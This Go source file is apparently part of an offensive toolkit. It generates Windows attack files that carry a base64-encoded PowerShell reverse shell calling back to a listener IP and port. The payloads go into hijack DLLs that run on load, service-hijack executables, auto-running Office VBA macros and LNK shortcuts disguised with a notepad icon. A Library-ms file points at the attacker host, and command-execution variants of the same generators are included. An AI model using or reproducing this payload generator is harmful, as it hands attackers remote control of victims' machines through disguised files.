package expy

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// GenerateOptions contains options for generating attack files
type GenerateOptions struct {
    PayloadType  string
    Type         string
    Name         string
    ListenerIP   string
    ListenerPort string
    Command      string
    OutputDir    string
}

// GenerateResult contains result of generation
type GenerateResult struct {
	Type     string `json:"type"`
	Filename string `json:"filename"`
	Content  string `json:"content,omitempty"`
}

// encodeToBase64 encodes a string to base64 in UTF-16LE format
func encodeToBase64(input string) string {
	// Convert to UTF-16LE
	var utf16 []byte
	for _, r := range input {
		utf16 = append(utf16, byte(r), 0)
	}
	
	// Encode to base64
	return base64.StdEncoding.EncodeToString(utf16)
}

// generateReverseShellScript returns a PowerShell reverse shell script
func generateReverseShellScript(ip, port string) string {
	return fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", ip, port)
}

// GenerateLibraryMS generates a Library-ms file
func GenerateLibraryMS(opts GenerateOptions) (*GenerateResult, error) {
	name := opts.Name
	if !strings.HasSuffix(name, ".Library-ms") {
		name = name + ".Library-ms"
	}
	
	filePath := filepath.Join(opts.OutputDir, name)
	
	// Create Library-ms content
	content := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://%s</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>`, opts.ListenerIP)
	
	// Write to file
	if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
		return nil, err
	}
	
	return &GenerateResult{
		Type:     "Library_ms",
		Filename: name,
	}, nil
}

// GenerateDLLHijack generates a DLL hijack file
func GenerateDLLHijack(opts GenerateOptions) (*GenerateResult, error) {
	// Check if mingw is installed
	if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
		return nil, fmt.Errorf("x86_64-w64-mingw32-gcc not found, please install mingw-w64")
	}
	
	name := opts.Name
	sourceFile := filepath.Join(opts.OutputDir, name+".c")
	outputFile := filepath.Join(opts.OutputDir, name+".dll")
	
	// Generate reverse shell payload
	reverseShell := generateReverseShellScript(opts.ListenerIP, opts.ListenerPort)
	encodedPayload := encodeToBase64(reverseShell)
	
	// Create C source file
	cSource := fmt.Sprintf(`#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
	        i = system("powershell -ep bypass -WindowStyle Hidden -e %s");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
	break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}`, encodedPayload)
	
	// Write source file
	if err := os.WriteFile(sourceFile, []byte(cSource), 0644); err != nil {
		return nil, err
	}
	
	// Compile with mingw
	cmd := exec.Command("x86_64-w64-mingw32-gcc", "-shared", sourceFile, "-o", outputFile)
	if err := cmd.Run(); err != nil {
		return nil, err
	}
	
	return &GenerateResult{
		Type:     "dll_hijack",
		Filename: name + ".dll",
	}, nil
}

// GenerateServiceHijack generates a service hijack executable
func GenerateServiceHijack(opts GenerateOptions) (*GenerateResult, error) {
	// Check if mingw is installed
	if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
		return nil, fmt.Errorf("x86_64-w64-mingw32-gcc not found, please install mingw-w64")
	}
	
	name := opts.Name
	sourceFile := filepath.Join(opts.OutputDir, name+".c")
	outputFile := filepath.Join(opts.OutputDir, name+".exe")
	
	// Generate reverse shell payload
	reverseShell := generateReverseShellScript(opts.ListenerIP, opts.ListenerPort)
	encodedPayload := encodeToBase64(reverseShell)
	
	// Create C source file
	cSource := fmt.Sprintf(`#include <stdlib.h>

void main(){
	int i;
	i = system("powershell -ep bypass -WindowStyle Hidden -e %s");
}
`, encodedPayload)
	
	// Write source file
	if err := os.WriteFile(sourceFile, []byte(cSource), 0644); err != nil {
		return nil, err
	}
	
	// Compile with mingw
	cmd := exec.Command("x86_64-w64-mingw32-gcc", sourceFile, "-o", outputFile)
	if err := cmd.Run(); err != nil {
		return nil, err
	}
	
	return &GenerateResult{
		Type:     "service_hijack",
		Filename: name + ".exe",
	}, nil
}

// GenerateMicrosoftMacro generates VBA macro code
func GenerateMicrosoftMacro(opts GenerateOptions) (*GenerateResult, error) {
	name := opts.Name
	
	// Generate reverse shell payload
	reverseShell := generateReverseShellScript(opts.ListenerIP, opts.ListenerPort)
	encodedPayload := encodeToBase64(reverseShell)
	
	// Create PowerShell command
	powershellCmd := "powershell.exe -nop -w hidden -ep bypass -e " + encodedPayload
	
	// Split the command into chunks
	n := 50
	var chunks []string
	
	for i := 0; i < len(powershellCmd); i += n {
		end := i + n
		if end > len(powershellCmd) {
			end = len(powershellCmd)
		}
		chunks = append(chunks, powershellCmd[i:end])
	}
	
	// Build macro code
	var strConcat strings.Builder
	for _, chunk := range chunks {
		strConcat.WriteString(fmt.Sprintf("    Str = Str + \"%s\"\n", chunk))
	}
	
	macroCode := fmt.Sprintf(`Sub AutoOpen()
    %s
End Sub

Sub Document_Open()
    %s
End Sub

Sub %s()
    Dim Str As String
%s
    CreateObject("Wscript.Shell").Run Str
End Sub`, name, name, name, strConcat.String())
	
	return &GenerateResult{
		Type:     "microsoft_macro",
		Filename: name,
		Content:  macroCode,
	}, nil
}

// GenerateLNK generates a LNK shortcut file
func GenerateLNK(opts GenerateOptions) (*GenerateResult, error) {
	name := opts.Name
	if !strings.HasSuffix(name, ".lnk") {
		name = name + ".lnk"
	}
	
	filePath := filepath.Join(opts.OutputDir, name)
	
	// Generate reverse shell payload
	reverseShell := generateReverseShellScript(opts.ListenerIP, opts.ListenerPort)
	encodedPayload := encodeToBase64(reverseShell)
	
	// Create PowerShell command
	powershellCmd := fmt.Sprintf("/c powershell -ep bypass -WindowStyle Hidden -e %s", encodedPayload)
	
	// Create LNK using pylnk3 command
	cmd := exec.Command("pylnk3", "create", "C:\\Windows\\System32\\cmd.exe", 
		"-a", powershellCmd, 
		"-i", "C:\\windows\\system32\\notepad.exe", 
		"-w", "C:\\windows\\system32\\", 
		filePath)
	
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("failed to create LNK file, do you have pylnk3 installed? Error: %v", err)
	}
	
	return &GenerateResult{
		Type:     "lnk",
		Filename: name,
	}, nil
}

// GenerateFile generates an attack file based on options
// GenerateFile generates an attack file based on options
func GenerateFile(opts GenerateOptions) (*GenerateResult, error) {
    
    // Handle different payload types
    switch opts.PayloadType {
    case "reverse_shell":
        switch opts.Type {
        case "Library_ms":
            return GenerateLibraryMS(opts)
        case "dll_hijack":
            return GenerateDLLHijack(opts)
        case "service_hijack":
            return GenerateServiceHijack(opts)
        case "microsoft_macro":
            return GenerateMicrosoftMacro(opts)
        case "lnk":
            return GenerateLNK(opts)
        default:
            return nil, fmt.Errorf("unsupported file type for reverse shell: %s", opts.Type)
        }
    case "execute_command":
        switch opts.Type {
        case "dll_hijack":
            return GenerateCommandDLLHijack(opts)
        case "service_hijack":
            return GenerateCommandServiceHijack(opts)
        case "lnk":
            return GenerateCommandLNK(opts)
        default:
            return nil, fmt.Errorf("unsupported file type for command execution: %s", opts.Type)
        }
    default:
        return nil, fmt.Errorf("unsupported payload type: %s", opts.PayloadType)
    }
}
// GenerateCommandDLLHijack generates a DLL hijack file that executes a command
func GenerateCommandDLLHijack(opts GenerateOptions) (*GenerateResult, error) {
    name := opts.Name
    sourceFile := filepath.Join(opts.OutputDir, name+".c")
    
    // Create C source file
    cSource := fmt.Sprintf(`#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
            i = system("%s");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
    break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}`, opts.Command)
    
    // Write source file
    if err := os.WriteFile(sourceFile, []byte(cSource), 0644); err != nil {
        return nil, err
    }
    
    // Try to compile with mingw if available
    _, err := exec.LookPath("x86_64-w64-mingw32-gcc")
    if err == nil {
        outputFile := filepath.Join(opts.OutputDir, name+".dll")
        cmd := exec.Command("x86_64-w64-mingw32-gcc", "-shared", sourceFile, "-o", outputFile)
        if err := cmd.Run(); err != nil {
            // If compilation fails, return the C file
            return &GenerateResult{
                Type:     "dll_hijack_source",
                Filename: name + ".c",
                Content:  cSource,
            }, nil
        }
        
        return &GenerateResult{
            Type:     "dll_hijack",
            Filename: name + ".dll",
        }, nil
    }
    
    // If mingw is not available, return the C file
    return &GenerateResult{
        Type:     "dll_hijack_source",
        Filename: name + ".c",
        Content:  cSource,
    }, nil
}

// GenerateCommandServiceHijack generates a service hijack executable that executes a command
func GenerateCommandServiceHijack(opts GenerateOptions) (*GenerateResult, error) {
    name := opts.Name
    sourceFile := filepath.Join(opts.OutputDir, name+".c")
    
    // Create C source file
    cSource := fmt.Sprintf(`#include <stdlib.h>

void main(){
    int i;
    i = system("%s");
}
`, opts.Command)
    
    // Write source file
    if err := os.WriteFile(sourceFile, []byte(cSource), 0644); err != nil {
        return nil, err
    }
    
    // Try to compile with mingw if available
    _, err := exec.LookPath("x86_64-w64-mingw32-gcc")
    if err == nil {
        outputFile := filepath.Join(opts.OutputDir, name+".exe")
        cmd := exec.Command("x86_64-w64-mingw32-gcc", sourceFile, "-o", outputFile)
        if err := cmd.Run(); err != nil {
            // If compilation fails, return the C file
            return &GenerateResult{
                Type:     "service_hijack_source",
                Filename: name + ".c",
                Content:  cSource,
            }, nil
        }
        
        return &GenerateResult{
            Type:     "service_hijack",
            Filename: name + ".exe",
        }, nil
    }
    
    // If mingw is not available, return the C file
    return &GenerateResult{
        Type:     "service_hijack_source",
        Filename: name + ".c",
        Content:  cSource,
    }, nil
}

// GenerateCommandLNK generates a LNK shortcut file that executes a command
func GenerateCommandLNK(opts GenerateOptions) (*GenerateResult, error) {
    name := opts.Name
    if !strings.HasSuffix(name, ".lnk") {
        name = name + ".lnk"
    }
    
    filePath := filepath.Join(opts.OutputDir, name)
    
    // Create LNK using pylnk3 command
    cmd := exec.Command("pylnk3", "create", "C:\\Windows\\System32\\cmd.exe", 
        "-a", fmt.Sprintf("/c %s", opts.Command), 
        "-i", "C:\\windows\\system32\\notepad.exe", 
        "-w", "C:\\windows\\system32\\", 
        filePath)
    
    if err := cmd.Run(); err != nil {
        return nil, fmt.Errorf("failed to create LNK file: %v", err)
    }
    
    return &GenerateResult{
        Type:     "lnk",
        Filename: name,
    }, nil
}